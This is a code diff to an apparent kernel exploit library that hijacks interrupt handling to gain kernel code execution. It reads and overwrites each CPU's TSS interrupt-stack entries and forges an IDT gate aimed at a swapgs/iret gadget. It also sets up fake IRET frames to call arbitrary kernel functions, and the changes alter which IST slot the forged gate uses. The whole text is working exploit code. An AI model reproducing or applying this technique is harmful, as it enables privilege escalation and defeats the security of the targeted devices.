@@ -123,13 +123,13 @@ int kprim_init(kprim_ctx* ctx, uint32_t fw_version)
     // Save original IST3 values for all CPUs
     for (int cpu = 0; cpu < TSS_NUM_CPUS; cpu++)
     {
-        uint64_t tss_ist3_addr = ctx->tss_base + cpu * TSS_PER_CPU_SIZE + TSS_IST3_OFFSET;
-        kernel_copyout(tss_ist3_addr, &ctx->orig_ist3[cpu], sizeof(uint64_t));
+        uint64_t tss_ist3_addr = ctx->tss_base + cpu * TSS_PER_CPU_SIZE + TSS_IST_OFFSET;
+        kernel_copyout(tss_ist3_addr, &ctx->orig_ist[cpu], sizeof(uint64_t));
     }
 
     // Build new IDT gate (stored locally, written in kprim_arm)
     kprim_build_idt_gate(&ctx->new_gate, ctx->gadget_swapgs_add_rsp_iret,
-        ctx->kernel_cs, 3, 3);
+        ctx->kernel_cs, 2, 3);
 
     // Entry IRET frame: lands at pop_all_iret with RSP=fake trap frame
     volatile uint64_t* entry_frame = (volatile uint64_t*)((uint8_t*)page + PAGE_ENTRY_IRET_OFF);
@@ -159,7 +159,7 @@ static void kprim_arm(kprim_ctx* ctx)
     uint64_t ist3_val = ctx->page_dmap + PAGE_IST_TOP_OFF;
     for (int cpu = 0; cpu < TSS_NUM_CPUS; cpu++)
     {
-        uint64_t tss_ist3_addr = ctx->tss_base + cpu * TSS_PER_CPU_SIZE + TSS_IST3_OFFSET;
+        uint64_t tss_ist3_addr = ctx->tss_base + cpu * TSS_PER_CPU_SIZE + TSS_IST_OFFSET;
         kernel_copyin(&ist3_val, tss_ist3_addr, sizeof(uint64_t));
     }
 
@@ -175,8 +175,8 @@ static void kprim_disarm(kprim_ctx* ctx)
     // Restore original TSS IST3
     for (int cpu = 0; cpu < TSS_NUM_CPUS; cpu++)
     {
-        uint64_t tss_ist3_addr = ctx->tss_base + cpu * TSS_PER_CPU_SIZE + TSS_IST3_OFFSET;
-        kernel_copyin(&ctx->orig_ist3[cpu], tss_ist3_addr, sizeof(uint64_t));
+        uint64_t tss_ist3_addr = ctx->tss_base + cpu * TSS_PER_CPU_SIZE + TSS_IST_OFFSET;
+        kernel_copyin(&ctx->orig_ist[cpu], tss_ist3_addr, sizeof(uint64_t));
     }
 }
 
@@ -206,7 +206,7 @@ uint64_t kprim_kcall(kprim_ctx* ctx, uint64_t target,
 
     uint8_t* page = (uint8_t*)ctx->user_page;
 
-    // Rewrite entry IRET frame
+    // Rewrite entry IRET frame to avoid garbage
     volatile uint64_t* entry_frame = (volatile uint64_t*)(page + PAGE_ENTRY_IRET_OFF);
     entry_frame[0] = ctx->gadget_pop_all_iret;
     entry_frame[1] = ctx->kernel_cs;
